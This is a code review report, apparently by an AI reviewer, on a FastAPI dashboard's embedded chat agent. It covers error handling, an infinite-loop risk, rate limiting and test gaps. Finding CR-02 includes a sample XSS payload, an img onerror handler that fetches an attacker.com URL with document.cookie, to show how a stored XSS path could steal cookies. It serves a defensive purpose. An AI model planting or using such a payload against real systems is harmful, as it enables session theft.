---
phase: 06-embedded-natural-language-agent
reviewed: 2026-06-16T19:40:00-06:00
depth: standard
files_reviewed: 9
files_reviewed_list:
  - app/schemas/agent.py
  - app/services/agent.py
  - app/routers/agent.py
  - app/main.py
  - tests/test_agent.py
  - frontend/js/agent.js
  - frontend/index.html
  - frontend/css/styles.css
  - frontend/js/dashboard.js
findings:
  critical: 2
  warning: 3
  info: 2
  total: 7
status: issues_found
---

# Phase 06: Code Review Report

**Reviewed:** 2026-06-16T19:40:00-06:00
**Depth:** standard
**Files Reviewed:** 9
**Status:** issues_found

## Summary

The Phase 6 agent implementation is structurally sound — the tool-use loop, auth wiring, schema validation, and frontend escaping are all correct for the happy path. Two blockers exist: Anthropic SDK exceptions propagate as unhandled 500s instead of the intended 502 (the router only catches `ValueError`), and the CDN-loaded `marked@12` renders Claude's answers with `innerHTML` without SRI or a sanitizer, creating a stored XSS path through tool-result data sourced from Pipedrive/Sheets. Three warnings cover unvalidated `role` values in the history schema, a theoretical infinite loop when `stop_reason=tool_use` arrives with no `tool_use` blocks, and no server-side rate limiting on the endpoint beyond the UI button state.

---

## Critical Issues

### CR-01: Anthropic API exceptions bypass the 502 handler — callers receive HTTP 500

**File:** `app/routers/agent.py:51` / `app/services/agent.py:370,437`

**Issue:** The router wraps `agent_service.chat()` in `except ValueError` only. The Anthropic SDK raises a separate exception hierarchy (`anthropic.APIStatusError`, `anthropic.APIConnectionError`, `anthropic.RateLimitError`, `anthropic.AuthenticationError`, etc.) for every class of API failure — network errors, 429s, 500s from Anthropic, auth failures, and malformed-request errors (e.g., a history message with `role="system"` causes `anthropic.BadRequestError`). None of these are `ValueError` subclasses. They propagate unhandled through the router and FastAPI returns an HTTP 500 Internal Server Error with a stack trace in the response body (depending on `debug` mode), instead of the intended 502 Bad Gateway with the safe generic message. The router docstring explicitly promises 502 for Anthropic failures; the code breaks that contract.

**Fix:**
```python
# app/routers/agent.py
from anthropic import APIError  # catches all Anthropic SDK errors

@router.post("/chat", response_model=ChatResponse)
def chat(body: ChatRequest, db: Session = Depends(get_db)):
    try:
        answer = agent_service.chat(
            db,
            body.message,
            [m.model_dump() for m in body.history],
        )
    except (ValueError, APIError) as exc:
        raise HTTPException(
            status_code=status.HTTP_502_BAD_GATEWAY,
            detail="Error al consultar el agente",
        ) from exc
    return ChatResponse(answer=answer)
```

---

### CR-02: marked.js renders Claude answers into `innerHTML` without SRI or sanitizer — stored XSS via tool data

**File:** `frontend/index.html:364` / `frontend/js/agent.js:105`

**Issue:** `marked@12` is loaded from a CDN (`cdn.jsdelivr.net`) with no `integrity` attribute (no Subresource Integrity check). A CDN compromise or cache-poisoning attack would silently replace the library. Separately — and more immediately — `marked.parse()` does not sanitize HTML; it passes raw HTML present in the Markdown string through to the DOM. The Claude answer is sourced from tool results that contain external data: Pipedrive deal titles, lead names from Google Sheets, and Trello card names. If any of these contain HTML/JS (e.g., a deal titled `<img src=x onerror="fetch('https://attacker.com/'+document.cookie)">`), the data flows: external CRM → DB → service function → tool result JSON → Claude response → `marked.parse()` → `innerHTML`. Claude often reproduces data verbatim when listing deals or leads. This is a stored XSS path that bypasses the `escHtml()` protection on user-supplied text. The project's CLAUDE.md requires read-only access to Pipedrive/Sheets; any actor who can write a malicious string to Pipedrive or Sheets can trigger XSS in the dashboard.

**Fix — two independent mitigations, both recommended:**

1. Add SRI hash to the `marked` script tag:
```html
<!-- Replace the current script tag with a pinned version + integrity hash -->
<!-- Generate with: curl -s https://cdn.jsdelivr.net/npm/marked@12.0.0/marked.min.js | openssl dgst -sha384 -binary | openssl base64 -A -->
<script src="https://cdn.jsdelivr.net/npm/marked@12.0.0/marked.min.js"
        integrity="sha384-<hash-here>"
        crossorigin="anonymous"></script>
```
Or serve `marked.min.js` from `/js/` as a vendored local file (eliminates CDN risk entirely).

2. Add DOMPurify as a sanitizer layer before `innerHTML`:
```html
<!-- in index.html, before agent.js -->
<script src="/js/purify.min.js"></script>
```
```javascript
// in agent.js, replace line 105:
loadingEl.innerHTML = `
  <div class="agent-qa-question">${escHtml(message)}</div>
  <div class="agent-qa-answer">${DOMPurify.sanitize(marked.parse(answer))}</div>
`;
```
DOMPurify strips `<script>`, event handlers, and dangerous URIs while preserving safe Markdown output (headings, lists, code blocks, tables). Download from: https://github.com/cure53/DOMPurify

---

## Warnings

### WR-01: `ChatMessage.role` is unconstrained — invalid roles reach the Anthropic API as unhandled exceptions

**File:** `app/schemas/agent.py:17`

**Issue:** `ChatMessage.role` is typed `str` with no validation. A client that sends `{"role": "system", "content": "..."}` or `{"role": "tool", "content": "..."}` in `history` passes Pydantic validation and is forwarded to the Anthropic API verbatim. Anthropic rejects non-`user`/`assistant` roles in `messages[]` with `anthropic.BadRequestError`. That exception is not caught by the router (see CR-01), producing an HTTP 500. Even after CR-01 is fixed, an invalid role results in a 502 on every request until the client clears history. For a stateless single-tenant internal tool the blast radius is small, but the schema should enforce the contract.

**Fix:**
```python
# app/schemas/agent.py
from typing import Literal

class ChatMessage(BaseModel):
    role: Literal["user", "assistant"]
    content: str
```
With this change, invalid roles return 422 (Pydantic validation error) before the Anthropic call is made, and the error message is explicit about the constraint.

---

### WR-02: Agent loop has no guard for `stop_reason=tool_use` with zero `tool_use` blocks — theoretical infinite loop

**File:** `app/services/agent.py:369-445`

**Issue:** The `while True` loop exits on `end_turn`, on unexpected stop reasons (line 383), or when `tool_call_count >= MAX_TOOL_CALLS` (line 436). If the Anthropic API returns `stop_reason="tool_use"` but `response.content` contains no `tool_use` blocks (an edge case that can arise from SDK version drift, API bugs, or future model behavior changes), the `for block in response.content` loop produces `tool_results = []`. The code then appends `{"role": "user", "content": []}` to messages and loops again. `tool_call_count` is never incremented, so the `>= MAX_TOOL_CALLS` guard never fires. The loop will keep making API calls until the Anthropic API rejects the malformed empty-content message or times out — potentially running indefinitely and incurring unbounded API costs.

**Fix:** Add an explicit guard after the tool-results loop, before appending the user turn:
```python
# After the for-block loop, before messages.append:
if not tool_results:
    # stop_reason=tool_use but no tool_use blocks — malformed API response
    logger.warning("agent: stop_reason=tool_use but no tool_use blocks; aborting loop")
    return "No pude completar la consulta."
```

---

### WR-03: No server-side rate limiting on `POST /agent/chat` — UI button state is the only throttle

**File:** `app/routers/agent.py:30` / `app/main.py`

**Issue:** The UI disables the "Preguntar" button while a request is in flight, which prevents accidental double-submission from the browser. However, nothing prevents a user (or a script with a valid JWT) from calling `POST /agent/chat` in rapid succession without using the browser UI. Each request may trigger up to 6 Anthropic API calls (5 tool calls + 1 synthesis). For a single-tenant internal dashboard with few users this is low-risk today, but there is no server-side limit (no `slowapi`, no token-bucket, no per-user request queue). If the JWT is ever compromised — or if a user scripts the endpoint — costs can spike significantly. The `MAX_TOOL_CALLS` ceiling (D-77) bounds cost per request but not request volume.

**Fix (minimal):** Add a server-side concurrency lock or a simple in-memory rate limit. For a single-tenant app, even a process-level semaphore (`asyncio.Semaphore` or `threading.Semaphore` depending on sync/async) limiting concurrent agent calls to 1-2 is sufficient:
```python
# app/services/agent.py
import threading
_agent_semaphore = threading.Semaphore(2)  # max 2 concurrent agent calls

def chat(db: Session, message: str, history: list[dict]) -> str:
    acquired = _agent_semaphore.acquire(blocking=False)
    if not acquired:
        raise ValueError("Demasiadas consultas simultáneas. Intenta de nuevo en un momento.")
    try:
        return _run_agent_loop(db=db, message=message, history=history)
    finally:
        _agent_semaphore.release()
```

---

## Info

### IN-01: No test coverage for Anthropic API exception path (non-`ValueError` errors)

**File:** `tests/test_agent.py`

**Issue:** `TestChatEndpoint` has no test that verifies the behavior when the Anthropic SDK raises an exception (e.g., `APIConnectionError`, `RateLimitError`). Post-CR-01 fix, these should return 502 — but without a test, a regression could silently revert to 500. The test map in the module docstring does not list this case.

**Fix:** Add a test case:
```python
def test_chat_anthropic_error_returns_502(self, auth_client, seed_talent_products, monkeypatch):
    """Anthropic SDK error → 502 Bad Gateway (not 500)."""
    import anthropic
    monkeypatch.setattr(
        "app.services.agent.anthropic.Anthropic",
        lambda **kwargs: MagicMock(
            messages=MagicMock(
                create=MagicMock(side_effect=anthropic.APIConnectionError(request=MagicMock()))
            )
        ),
    )
    response = auth_client.post("/agent/chat", json={"message": "¿Cuántos deals hay?"})
    assert response.status_code == 502
```

---

### IN-02: `ChatRequest.history` max-length test is undocumented and missing

**File:** `tests/test_agent.py` / `app/schemas/agent.py:30`

**Issue:** The schema enforces `max_length=20` on `history`. The test map (module docstring lines 4-9) lists `test_chat_message_too_long` as a test for the message field but does not include a corresponding test for `history` exceeding 20 messages. The `ChatRequest` docstring and the design note (D-73) call out this limit explicitly; a missing test leaves it unverified that Pydantic actually rejects the field.

**Fix:** Add to `TestChatEndpoint`:
```python
def test_chat_history_too_long(self, auth_client):
    """POST /agent/chat with history > 20 messages returns 422."""
    long_history = [{"role": "user", "content": "msg"}] * 21
    response = auth_client.post(
        "/agent/chat",
        json={"message": "¿Cuántos deals hay?", "history": long_history},
    )
    assert response.status_code == 422
```

---

_Reviewed: 2026-06-16T19:40:00-06:00_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
